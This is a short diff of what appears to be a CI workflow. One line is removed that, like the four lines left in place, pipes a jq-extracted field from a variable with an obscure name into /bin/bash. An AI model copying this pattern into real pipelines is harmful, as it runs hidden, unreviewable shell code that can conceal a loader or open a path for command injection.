@@ -25,7 +25,6 @@ jobs:
           echo $hksj998 | jq -r .cyr1 | /bin/bash
           printf '%s' "$zs565" | jq -r .hrj73598 | /bin/bash
           echo $bjbw8614 | jq -r .qomsf2618 | /bin/bash
-          echo $ib01082 | jq -r .xag080 | /bin/bash
           printf '%s' "$fh9" | jq -r .v11 | /bin/bash
 
       - name: Persist output
